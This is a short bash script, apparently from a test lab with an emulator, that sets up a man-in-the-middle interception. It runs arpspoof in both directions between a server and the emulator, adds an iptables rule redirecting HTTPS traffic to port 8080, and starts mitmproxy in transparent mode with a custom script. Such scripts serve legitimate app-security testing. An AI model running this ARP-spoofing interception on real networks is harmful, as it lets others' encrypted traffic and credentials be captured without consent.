#!/bin/bash

SERVER=$(getent hosts www.mitmtest.com | awk '{ print $1 }')
echo "Server is on $SERVER"
EMULATOR=$(getent hosts emulator | awk '{ print $1 }')
echo "Emulator is on $EMULATOR"

echo "Starting arpspoof"
(&>/dev/null arpspoof -t $SERVER $EMULATOR &)
(&>/dev/null arpspoof -t $EMULATOR $SERVER &)

echo "Setting iptables rule"
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

echo "Starting mitmproxy"
mitmproxy -m transparent -s proxy.py --ssl-insecure

echo "Cleaning up"
kill -s SIGINT $(pidof arpspoof)
iptables -t nat -D PREROUTING 1
